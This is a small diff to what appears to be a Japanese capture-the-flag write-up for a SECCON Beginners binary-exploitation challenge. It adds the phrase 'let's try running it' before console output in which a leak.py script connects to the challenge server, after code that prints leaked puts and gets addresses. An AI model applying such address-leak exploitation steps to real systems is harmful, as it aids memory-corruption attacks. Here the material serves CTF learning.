@@ -155,6 +155,8 @@ print 'puts  :', hexaddrs[1]
 print 'gets  :', hexaddrs[2]
 ```
 
+実行してみる
+
 ```console
 $ python leak.py
 [+] Opening connection to pwn1.chall.beginners.seccon.jp on port 18373: Done
